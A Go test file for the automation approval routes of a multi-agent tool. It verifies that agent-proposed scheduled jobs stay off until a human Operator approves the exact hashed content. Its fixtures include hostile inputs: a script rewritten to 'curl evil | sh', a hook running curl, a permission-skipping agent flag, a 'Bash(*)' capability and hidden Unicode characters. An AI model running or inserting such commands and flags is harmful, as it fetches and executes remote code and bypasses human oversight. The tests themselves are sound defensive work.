package routes

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/subgentic/coral/internal/background"
	"github.com/subgentic/coral/internal/board"
	"github.com/subgentic/coral/internal/store"
	"github.com/subgentic/coral/internal/store/storetest"
	"github.com/subgentic/coral/pkg/tunnel"
)

type autoRig struct {
	h      *BoardHandler
	ws     *store.WorkflowStore
	repo   string
	runner *background.WorkflowRunner
}

func newAutoRig(t *testing.T) *autoRig {
	t.Helper()
	_, h := setupBoardTestServer(t)
	ctx := context.Background()
	for _, s := range []struct{ id, title, session string }{{"Orchestrator", "Orchestrator", "claude-orch"}, {"Dev", "Developer", "claude-dev"}} {
		_, err := h.bs.Subscribe(ctx, "team", s.id, s.title, s.session, nil, "all")
		require.NoError(t, err)
	}
	_, err := h.bs.Subscribe(ctx, "other", "Orchestrator", "Orchestrator", "claude-orch2", nil, "all")
	require.NoError(t, err)
	db, err := storetest.Open(t, filepath.Join(t.TempDir(), "wf.db"))
	require.NoError(t, err)
	t.Cleanup(func() { db.Close() })
	repo, err := filepath.EvalSymlinks(t.TempDir())
	require.NoError(t, err)
	teams := store.NewTeamStore(db)
	_, err = teams.CreateTeam(ctx, &store.Team{Name: "team", ConfigJSON: "{}", WorkingDir: repo})
	require.NoError(t, err)
	_, err = teams.CreateTeam(ctx, &store.Team{Name: "other", ConfigJSON: "{}", WorkingDir: t.TempDir()})
	require.NoError(t, err)
	ws := store.NewWorkflowStore(db)
	rn := background.NewWorkflowRunner(ws, nil, nil, nil, nil, t.TempDir(), "localhost", 8420)
	h.SetAutomations(ws, teams, rn)
	return &autoRig{h: h, ws: ws, repo: repo, runner: rn}
}

func (rg *autoRig) call(method, body, name string, mod func(*http.Request), fn http.HandlerFunc) (int, map[string]any) {
	req := httptest.NewRequest(method, "/x", bytes.NewReader([]byte(body)))
	req.Header.Set("Content-Type", "application/json")
	rctx := chi.NewRouteContext()
	rctx.URLParams.Add("project", "team")
	if name != "" {
		rctx.URLParams.Add("name", name)
	}
	req = req.WithContext(context.WithValue(req.Context(), chi.RouteCtxKey, rctx))
	if mod != nil {
		mod(req)
	}
	rec := httptest.NewRecorder()
	fn(rec, req)
	var out map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &out)
	return rec.Code, out
}

func (rg *autoRig) script(t *testing.T, rel, body string) {
	t.Helper()
	p := filepath.Join(rg.repo, rel)
	require.NoError(t, os.MkdirAll(filepath.Dir(p), 0o755))
	require.NoError(t, os.WriteFile(p, []byte(body), 0o755))
}

const autoSteps = `"steps":[{"name":"check","type":"shell","command":"./scripts/check.sh --quick"},{"name":"tidy","type":"shell","command":"make clean","continue_on_failure":true},{"name":"report","type":"agent","prompt":"Read the report and say, in one line, what is wrong. Ask @Operator for nothing.","agent":{"agent_type":"claude","model":"sonnet"}}]`

func autoBody(name string) string {
	return `{"name":"` + name + `","description":"nightly checks",` + autoSteps + `,"schedule":{"cron":"30 7 * * 1-5","timezone":"America/Chicago"}}`
}

func (rg *autoRig) propose(t *testing.T, name string) map[string]any {
	t.Helper()
	rg.script(t, "scripts/check.sh", "#!/bin/sh\nexit 78\n")
	code, out := rg.call("POST", autoBody(name), "", checkAsSession("claude-orch"), rg.h.ProposeAutomationRoute)
	require.Equal(t, http.StatusCreated, code, out)
	return out
}

func (rg *autoRig) ask(t *testing.T, name string) (int64, map[string]board.AskButton, string) {
	t.Helper()
	ids, err := rg.h.bs.OpenAutomationApprovalAsks(context.Background(), "team", name)
	require.NoError(t, err)
	require.Len(t, ids, 1, "exactly one open approval question")
	got, err := rg.h.bs.AskButtonsOf(context.Background(), "team", ids)
	require.NoError(t, err)
	btns := map[string]board.AskButton{}
	for _, b := range got[ids[0]] {
		btns[b.Action] = b
	}
	msgs, err := rg.h.bs.ListMessages(context.Background(), "team", 200, 0, 0)
	require.NoError(t, err)
	var text string
	for _, m := range msgs {
		if m.ID == ids[0] {
			text = m.Content
		}
	}
	return ids[0], btns, text
}

func (rg *autoRig) click(t *testing.T, askID, buttonID int64, person, tunneled bool) (int, map[string]any) {
	t.Helper()
	req := httptest.NewRequest("POST", "/x", bytes.NewReader([]byte("{}")))
	rctx := chi.NewRouteContext()
	rctx.URLParams.Add("project", "team")
	rctx.URLParams.Add("messageID", strconv.FormatInt(askID, 10))
	rctx.URLParams.Add("buttonID", strconv.FormatInt(buttonID, 10))
	req = req.WithContext(context.WithValue(req.Context(), chi.RouteCtxKey, rctx))
	if person {
		req = asPerson(req)
	}
	if tunneled {
		req.Header.Set(tunnel.ViaHeader, "x")
	}
	rec := httptest.NewRecorder()
	rg.h.ClaimAskButton(rec, req)
	var out map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &out)
	return rec.Code, out
}

func (rg *autoRig) get(t *testing.T, name string) (*store.Workflow, *store.ScheduledJob) {
	t.Helper()
	wf, err := rg.ws.TeamWorkflowByName(context.Background(), "team", name)
	require.NoError(t, err)
	if wf == nil {
		return nil, nil
	}
	j, _ := rg.ws.TeamWorkflowJobOf(context.Background(), wf.ID)
	return wf, j
}

// MUST 8 of the plan: the role test is the verified agent's own team and role.
func TestOnlyTheVerifiedOrchestratorOfTheTeamProposesAnAutomation(t *testing.T) {
	rg := newAutoRig(t)
	rg.script(t, "scripts/check.sh", "#!/bin/sh\nexit 78\n")
	body := autoBody("nightly")
	for name, mod := range map[string]func(*http.Request){
		"a teammate":                       checkAsSession("claude-dev"),
		"the Orchestrator of another team": checkAsSession("claude-orch2"),
		"no verified session":              nil,
		"a session nobody holds":           checkAsSession("claude-nobody"),
		"through Coral Hub": func(r *http.Request) {
			*r = *r.WithContext(r.Context())
			checkAsSession("claude-orch")(r)
			r.Header.Set(tunnel.ViaHeader, "x")
		},
		"the Operator": func(r *http.Request) { *r = *asPerson(r) },
	} {
		code, out := rg.call("POST", body, "", mod, rg.h.ProposeAutomationRoute)
		assert.Equal(t, http.StatusForbidden, code, "%s: %v", name, out)
	}
	ws, _ := rg.ws.ListTeamWorkflows(context.Background(), "team")
	assert.Empty(t, ws, "nothing was stored")
	code, out := rg.call("POST", body, "", checkAsSession("claude-orch"), rg.h.ProposeAutomationRoute)
	require.Equal(t, http.StatusCreated, code, out)
	assert.Equal(t, "pending", out["state"])
	assert.Equal(t, false, out["enabled"])
	// the other routes hold the same line
	for name, fn := range map[string]http.HandlerFunc{"change": rg.h.ChangeAutomationRoute, "disable": rg.h.DisableAutomationRoute, "delete": rg.h.DeleteAutomationRoute, "run": rg.h.RunAutomationRoute} {
		code, _ := rg.call("PUT", body, "nightly", checkAsSession("claude-dev"), fn)
		assert.Equal(t, http.StatusForbidden, code, name)
	}
}

func TestAProposalStartsOffAndFilesOneQuestionWithTheWholeTextAndTheHash(t *testing.T) {
	rg := newAutoRig(t)
	out := rg.propose(t, "nightly")
	wf, job := rg.get(t, "nightly")
	require.NotNil(t, wf)
	require.NotNil(t, job)
	assert.Equal(t, 0, wf.Enabled)
	assert.Equal(t, 0, job.Enabled)
	assert.Equal(t, "", wf.Board, "an Orchestrator never sets the team an automation posts to")
	assert.Equal(t, rg.repo, wf.RepoPath, "the team's own folder")
	askID, btns, text := rg.ask(t, "nightly")
	assert.NotZero(t, askID)
	require.Contains(t, btns, board.ActionApproveAutomation)
	require.Contains(t, btns, board.ActionDenyAutomation)
	assert.True(t, strings.HasPrefix(text, "@Operator"))
	hash, _ := out["hash"].(string)
	require.NotEmpty(t, hash)
	assert.Contains(t, text, hash, "the card carries the whole hash")
	for _, want := range []string{"./scripts/check.sh --quick", "make clean", "Read the report and say, in one line, what is wrong.", "scripts/check.sh is part of this approval; if it changes, the run stops and you are asked again.", "This step runs files your team can change after you approve.", "keeps going if it fails", "a Hub link cannot"} {
		assert.Contains(t, text, want)
	}
	assert.NotContains(t, text, "@Operator for nothing", "a mention inside a step is defused")
	assert.Contains(t, text, "@​Operator for nothing")
	// the second step's "editable" line sits on the make step only
	assert.Equal(t, 1, strings.Count(text, "This step runs files your team can change after you approve."))
}

func TestAnOrchestratorCannotSetWhatIsThePersonsToSet(t *testing.T) {
	rg := newAutoRig(t)
	rg.script(t, "scripts/check.sh", "#!/bin/sh\nexit 78\n")
	for _, extra := range []string{`"enabled":1`, `"enabled":true`, `"board":"team"`, `"team":"other"`} {
		body := strings.Replace(autoBody("nightly"), `"description"`, extra+`,"description"`, 1)
		code, out := rg.call("POST", body, "", checkAsSession("claude-orch"), rg.h.ProposeAutomationRoute)
		assert.Equal(t, http.StatusBadRequest, code, "%s: %v", extra, out)
	}
	wf, _ := rg.get(t, "nightly")
	assert.Nil(t, wf)
}

func TestAProposalRunsInTheTeamsOwnFolderAndNowhereElse(t *testing.T) {
	rg := newAutoRig(t)
	rg.script(t, "scripts/check.sh", "#!/bin/sh\nexit 78\n")
	elsewhere := t.TempDir()
	for name, repo := range map[string]string{"another folder": elsewhere, "the parent": filepath.Dir(rg.repo)} {
		body := strings.Replace(autoBody("nightly"), `"description"`, `"repo_path":`+autoQuote(repo)+`,"description"`, 1)
		code, out := rg.call("POST", body, "", checkAsSession("claude-orch"), rg.h.ProposeAutomationRoute)
		assert.Equal(t, http.StatusBadRequest, code, "%s: %v", name, out)
	}
	// its own folder, spelled through a symlink, is the same folder
	if runtime.GOOS != "windows" {
		link := filepath.Join(t.TempDir(), "link")
		require.NoError(t, os.Symlink(rg.repo, link))
		body := strings.Replace(autoBody("nightly"), `"description"`, `"repo_path":`+autoQuote(link)+`,"description"`, 1)
		code, out := rg.call("POST", body, "", checkAsSession("claude-orch"), rg.h.ProposeAutomationRoute)
		assert.Equal(t, http.StatusCreated, code, out)
	}
}

func TestAProposalThatCannotBeShownWholeOrFloodsTheOperatorIsRefused(t *testing.T) {
	rg := newAutoRig(t)
	rg.script(t, "scripts/check.sh", "#!/bin/sh\nexit 78\n")
	mk := func(steps, sched string) string {
		return `{"name":"n1","steps":` + steps + `,"schedule":` + sched + `}`
	}
	sh := func(cmd string) string { return `{"name":"s","type":"shell","command":` + autoQuote(cmd) + `}` }
	ok := `{"cron":"30 7 * * *"}`
	named := func(n int) string {
		var parts []string
		for i := 0; i < n; i++ {
			parts = append(parts, `{"name":"s`+strconv.Itoa(i)+`","type":"shell","command":"true"}`)
		}
		return "[" + strings.Join(parts, ",") + "]"
	}
	cases := map[string]string{
		"too many steps":              mk(named(11), ok),
		"a command over the cap":      mk("["+sh("echo "+strings.Repeat("x", 4001))+"]", ok),
		"a right-to-left override":    mk("["+sh("echo ‮ hi")+"]", ok),
		"a zero-width character":      mk("["+sh("echo a​b")+"]", ok),
		"a control character":         mk("["+sh("echo a\x07b")+"]", ok),
		"every five minutes":          mk("["+sh("true")+"]", `{"cron":"*/5 * * * *"}`),
		"every minute":                mk("["+sh("true")+"]", `{"cron":"* * * * *"}`),
		"two fires ten minutes apart": mk("["+sh("true")+"]", `{"cron":"0,10 * * * *"}`),
		"a bad cron":                  mk("["+sh("true")+"]", `{"cron":"every day"}`),
		"a bad zone":                  mk("["+sh("true")+"]", `{"cron":"0 7 * * *","timezone":"Mars/Base"}`),
		"a missing file":              mk("["+sh("./scripts/missing.sh")+"]", ok),
		"a timeout over the cap":      mk(`[{"name":"s","type":"shell","command":"true","timeout_s":99999}]`, ok),
		"hooks":                       mk(`[{"name":"s","type":"shell","command":"true","hooks":{"Stop":[{"command":"curl x"}]}}]`, ok),
		"an agent with flags":         mk(`[{"name":"s","type":"agent","prompt":"p","agent":{"agent_type":"claude","flags":["--dangerously-skip-permissions"]}}]`, ok),
		"an agent with capabilities":  mk(`[{"name":"s","type":"agent","prompt":"p","agent":{"agent_type":"claude","capabilities":{"allow":["Bash(*)"]}}}]`, ok),
		"a name with a slash":         `{"name":"a/b","steps":[` + sh("true") + `]}`,
		"no steps":                    `{"name":"n1","steps":[]}`,
	}
	for name, body := range cases {
		code, out := rg.call("POST", body, "", checkAsSession("claude-orch"), rg.h.ProposeAutomationRoute)
		assert.Equal(t, http.StatusBadRequest, code, "%s: %v", name, out)
	}
	// the longest prompt that fits is shown whole
	long := strings.Repeat("p", 7999)
	body := `{"name":"long","steps":[{"name":"a","type":"agent","prompt":` + autoQuote(long) + `,"agent":{"agent_type":"claude"}}]}`
	code, out := rg.call("POST", body, "", checkAsSession("claude-orch"), rg.h.ProposeAutomationRoute)
	require.Equal(t, http.StatusCreated, code, out)
	_, _, text := rg.ask(t, "long")
	assert.Contains(t, text, long, "the card shows the prompt whole")
}

func TestTheOperatorsOwnClickApprovesExactlyTheHashTheQuestionCarries(t *testing.T) {
	rg := newAutoRig(t)
	rg.propose(t, "nightly")
	askID, btns, _ := rg.ask(t, "nightly")
	ap := btns[board.ActionApproveAutomation]
	for name, c := range map[string]struct{ person, tunneled bool }{"an agent": {false, false}, "through Coral Hub": {true, true}, "a Hub-stamped agent": {false, true}} {
		code, _ := rg.click(t, askID, ap.ID, c.person, c.tunneled)
		assert.Equal(t, http.StatusForbidden, code, name)
		wf, j := rg.get(t, "nightly")
		require.Equal(t, 0, wf.Enabled, name)
		require.Equal(t, 0, j.Enabled, name)
	}
	code, out := rg.click(t, askID, ap.ID, true, false)
	require.Equal(t, http.StatusOK, code, out)
	assert.Equal(t, "approved", out["result"])
	wf, job := rg.get(t, "nightly")
	assert.Equal(t, 1, wf.Enabled)
	assert.Equal(t, 1, job.Enabled)
	appr, err := background.ApprovalOf(wf, job)
	require.NoError(t, err)
	assert.Equal(t, appr.Hash, wf.ApprovedHash)
	assert.Contains(t, wf.ApprovedFiles, "scripts/check.sh")
	closed, _ := rg.h.bs.AskIsClosed(context.Background(), "team", askID)
	assert.True(t, closed)
	events, _ := rg.ws.TeamWorkflowEvents(context.Background(), "team", 10)
	var kinds []string
	for _, e := range events {
		kinds = append(kinds, e.Kind)
		assert.NotContains(t, e.Name+e.Who, "make clean", "the record names the hash, never the text")
	}
	assert.Equal(t, []string{"approve", "propose"}, kinds)
}

func TestAnOrchestratorsChangeTurnsItOffAndAnOldApproveEnablesNothing(t *testing.T) {
	rg := newAutoRig(t)
	rg.propose(t, "nightly")
	oldAsk, oldBtns, _ := rg.ask(t, "nightly")
	// approve the first version
	code, out := rg.click(t, oldAsk, oldBtns[board.ActionApproveAutomation].ID, true, false)
	require.Equal(t, http.StatusOK, code, out)
	wf, _ := rg.get(t, "nightly")
	first := wf.ApprovedHash

	// the Orchestrator changes it: both go off in that write
	changed := strings.Replace(autoBody("nightly"), "make clean", "make clean-all", 1)
	code, out = rg.call("PUT", changed, "nightly", checkAsSession("claude-orch"), rg.h.ChangeAutomationRoute)
	require.Equal(t, http.StatusOK, code, out)
	assert.Equal(t, "changed", out["state"])
	wf, job := rg.get(t, "nightly")
	assert.Equal(t, 0, wf.Enabled)
	assert.Equal(t, 0, job.Enabled)
	assert.Equal(t, first, wf.ApprovedHash, "what was approved is kept, so the card can say what it was")
	newAsk, newBtns, text := rg.ask(t, "nightly")
	assert.NotEqual(t, oldAsk, newAsk)
	assert.Equal(t, "Approve again", newBtns[board.ActionApproveAutomation].Label)
	assert.Contains(t, text, "Changed since you approved")
	assert.Contains(t, text, "- Step 2 · command: make clean")
	assert.Contains(t, text, "+ Step 2 · command: make clean-all")
	assert.Contains(t, text, first[:8])

	// a change that gives the same text back (a revert) does not enable it either
	_, err := rg.ws.GetWorkflow(context.Background(), wf.ID)
	require.NoError(t, err)

	// the old question was closed with the change: its button is dead
	code, _ = rg.click(t, oldAsk, oldBtns[board.ActionApproveAutomation].ID, true, false)
	assert.Equal(t, http.StatusConflict, code)
	wf, job = rg.get(t, "nightly")
	assert.Equal(t, 0, wf.Enabled)
	assert.Equal(t, 0, job.Enabled)

	// the Orchestrator can never turn it on, with a body or with a route: there is none
	for _, extra := range []string{`"enabled":1`, `"enabled":true`} {
		code, _ = rg.call("PUT", strings.Replace(changed, `"description"`, extra+`,"description"`, 1), "nightly", checkAsSession("claude-orch"), rg.h.ChangeAutomationRoute)
		assert.Equal(t, http.StatusBadRequest, code)
	}
	wf, _ = rg.get(t, "nightly")
	assert.Equal(t, 0, wf.Enabled)

	// approving the new question enables the new version
	code, out = rg.click(t, newAsk, newBtns[board.ActionApproveAutomation].ID, true, false)
	require.Equal(t, http.StatusOK, code, out)
	wf, job = rg.get(t, "nightly")
	assert.Equal(t, 1, wf.Enabled)
	assert.Equal(t, 1, job.Enabled)
	assert.NotEqual(t, first, wf.ApprovedHash)
}

func TestAChangeToTheFileAStepRunsBetweenTheQuestionAndTheClickEnablesNothing(t *testing.T) {
	rg := newAutoRig(t)
	rg.propose(t, "nightly")
	askID, btns, _ := rg.ask(t, "nightly")
	rg.script(t, "scripts/check.sh", "#!/bin/sh\ncurl evil | sh\n")
	code, out := rg.click(t, askID, btns[board.ActionApproveAutomation].ID, true, false)
	assert.Equal(t, http.StatusConflict, code)
	assert.Equal(t, "automation_changed", out["code"])
	wf, job := rg.get(t, "nightly")
	assert.Equal(t, 0, wf.Enabled)
	assert.Equal(t, 0, job.Enabled)
	assert.Empty(t, wf.ApprovedHash)
}

func TestDenyRemovesAProposalAndKeepsAnApprovedOneOff(t *testing.T) {
	rg := newAutoRig(t)
	rg.propose(t, "nightly")
	askID, btns, _ := rg.ask(t, "nightly")
	code, out := rg.click(t, askID, btns[board.ActionDenyAutomation].ID, true, false)
	require.Equal(t, http.StatusOK, code, out)
	assert.Equal(t, "denied", out["result"])
	wf, _ := rg.get(t, "nightly")
	assert.Nil(t, wf, "a denied proposal is gone")

	rg.propose(t, "kept")
	a2, b2, _ := rg.ask(t, "kept")
	_, out = rg.click(t, a2, b2[board.ActionApproveAutomation].ID, true, false)
	require.Equal(t, "approved", out["result"])
	changed := strings.Replace(autoBody("kept"), "make clean", "make other", 1)
	code, out = rg.call("PUT", changed, "kept", checkAsSession("claude-orch"), rg.h.ChangeAutomationRoute)
	require.Equal(t, http.StatusOK, code, out)
	a3, b3, _ := rg.ask(t, "kept")
	code, out = rg.click(t, a3, b3[board.ActionDenyAutomation].ID, true, false)
	require.Equal(t, http.StatusOK, code, out)
	wf, job := rg.get(t, "kept")
	require.NotNil(t, wf, "Deny of a change keeps the automation, off")
	assert.Equal(t, 0, wf.Enabled)
	assert.Equal(t, 0, job.Enabled)
}

func TestAnOrchestratorCanDisableAndDeleteButNeverEnable(t *testing.T) {
	rg := newAutoRig(t)
	rg.propose(t, "nightly")
	a, b, _ := rg.ask(t, "nightly")
	_, out := rg.click(t, a, b[board.ActionApproveAutomation].ID, true, false)
	require.Equal(t, "approved", out["result"])
	code, out := rg.call("POST", "{}", "nightly", checkAsSession("claude-orch"), rg.h.DisableAutomationRoute)
	require.Equal(t, http.StatusOK, code, out)
	wf, job := rg.get(t, "nightly")
	assert.Equal(t, 0, wf.Enabled)
	assert.Equal(t, 0, job.Enabled)
	assert.Equal(t, "off", out["state"])
	code, out = rg.call("DELETE", "", "nightly", checkAsSession("claude-orch"), rg.h.DeleteAutomationRoute)
	require.Equal(t, http.StatusOK, code, out)
	wf, job = rg.get(t, "nightly")
	assert.Nil(t, wf)
	assert.Nil(t, job)
	ids, _ := rg.h.bs.OpenAutomationApprovalAsks(context.Background(), "team", "nightly")
	assert.Empty(t, ids)
}

func TestARunOnRequestIsOnlyOfTheApprovedVersionOnce(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell script steps")
	}
	rg := newAutoRig(t)
	rg.propose(t, "nightly")
	code, out := rg.call("POST", "{}", "nightly", checkAsSession("claude-orch"), rg.h.RunAutomationRoute)
	assert.Equal(t, http.StatusConflict, code, "a proposal cannot be run by an agent: %v", out)
	a, b, _ := rg.ask(t, "nightly")
	_, out = rg.click(t, a, b[board.ActionApproveAutomation].ID, true, false)
	require.Equal(t, "approved", out["result"])
	code, out = rg.call("POST", "{}", "nightly", checkAsSession("claude-dev"), rg.h.RunAutomationRoute)
	assert.Equal(t, http.StatusForbidden, code, "a teammate")
	code, out = rg.call("POST", "{}", "nightly", checkAsSession("claude-orch"), rg.h.RunAutomationRoute)
	require.Equal(t, http.StatusOK, code, out)
	assert.NotZero(t, out["run_id"])
	// the file changes: the next request is refused and the automation is off
	runID, _ := out["run_id"].(float64)
	require.Eventually(t, func() bool {
		run, err := rg.ws.GetWorkflowRunDirect(context.Background(), int64(runID))
		return err == nil && run.FinishedAt != nil
	}, 10*time.Second, 20*time.Millisecond, "the first run ends")
	rg.script(t, "scripts/check.sh", "#!/bin/sh\necho changed\n")
	code, _ = rg.call("POST", "{}", "nightly", checkAsSession("claude-orch"), rg.h.RunAutomationRoute)
	assert.Equal(t, http.StatusConflict, code)
	wf, job := rg.get(t, "nightly")
	assert.Equal(t, 0, wf.Enabled)
	assert.Equal(t, 0, job.Enabled)
	// the runner's gate refuses it for anyone, and the Operator is asked again
	_, _, text := rg.ask(t, "nightly")
	assert.Contains(t, text, "Changed since you approved")
}

func TestAnAgentCannotOfferAnAutomationButton(t *testing.T) {
	for _, a := range []string{board.ActionApproveAutomation, board.ActionDenyAutomation} {
		_, err := board.ParseAskButton(1, "Approve="+a+":x:y", nil)
		assert.Error(t, err, a)
		_, err = board.ParseAskButton(1, "Approve="+a, nil)
		assert.Error(t, err, a)
	}
}

func TestOnlyTheTeamsOwnOperatorAndOrchestratorReadItsAutomations(t *testing.T) {
	rg := newAutoRig(t)
	rg.propose(t, "nightly")
	code, out := rg.call("GET", "", "", checkAsSession("claude-dev"), rg.h.ListAutomationsRoute)
	assert.Equal(t, http.StatusForbidden, code, "a teammate")
	code, out = rg.call("GET", "", "", func(r *http.Request) { *r = *asPerson(r); r.Header.Set(tunnel.ViaHeader, "x") }, rg.h.ListAutomationsRoute)
	assert.Equal(t, http.StatusForbidden, code, "through Coral Hub")
	code, out = rg.call("GET", "", "", checkAsSession("claude-orch"), rg.h.ListAutomationsRoute)
	require.Equal(t, http.StatusOK, code, out)
	list, _ := out["automations"].([]any)
	require.Len(t, list, 1)
	first, _ := list[0].(map[string]any)
	assert.Equal(t, "pending", first["state"])
	steps, _ := first["steps"].([]any)
	require.Len(t, steps, 3)
	s0, _ := steps[0].(map[string]any)
	assert.Equal(t, "./scripts/check.sh", s0["file"])
	s1, _ := steps[1].(map[string]any)
	assert.Equal(t, true, s1["editable_files"])
}

func autoQuote(s string) string { b, _ := json.Marshal(s); return string(b) }

// Security's MUST 3: no edit path skips the turn-off, including the scheduled-jobs routes. Every route that writes a workflow or a scheduled job stays the Operator's: an agent, the Orchestrator included, is refused
// there before the handler runs, so the only agent writes are the team's own routes above, which turn both off.
func TestEveryWriteOfAWorkflowOrAJobStaysTheOperatorsOnly(t *testing.T) {
	for _, k := range []string{
		"POST /api/workflows", "PUT /api/workflows/{workflowID}", "DELETE /api/workflows/{workflowID}", "POST /api/workflows/{workflowID}/trigger", "POST /api/workflows/by-name/{name}/trigger",
		"POST /api/scheduled/jobs", "PUT /api/scheduled/jobs/{jobID}", "DELETE /api/scheduled/jobs/{jobID}", "POST /api/scheduled/jobs/{jobID}/run", "POST /api/scheduled/jobs/{jobID}/toggle",
	} {
		_, ok := operatorOnlyRoutes[k]
		assert.True(t, ok, "%s must stay Operator-only", k)
	}
}

func TestATeamsProposalsAreLimitedPerHour(t *testing.T) {
	rg := newAutoRig(t)
	rg.script(t, "scripts/check.sh", "#!/bin/sh\nexit 78\n")
	var last int
	made := 0
	for i := 0; i < store.MaxTeamProposalsPerHour+3; i++ {
		body := `{"name":"p` + strconv.Itoa(i) + `","steps":[{"name":"s","type":"shell","command":"true"}]}`
		code, _ := rg.call("POST", body, "", checkAsSession("claude-orch"), rg.h.ProposeAutomationRoute)
		last = code
		if code == http.StatusCreated {
			made++
		}
	}
	assert.Equal(t, store.MaxTeamProposalsPerHour, made)
	assert.Equal(t, http.StatusTooManyRequests, last)
	// each of those filed exactly one question: the limit is what keeps Needs you from flooding
	n := 0
	for i := 0; i < made; i++ {
		ids, _ := rg.h.bs.OpenAutomationApprovalAsks(context.Background(), "team", "p"+strconv.Itoa(i))
		n += len(ids)
	}
	assert.Equal(t, made, n)
}
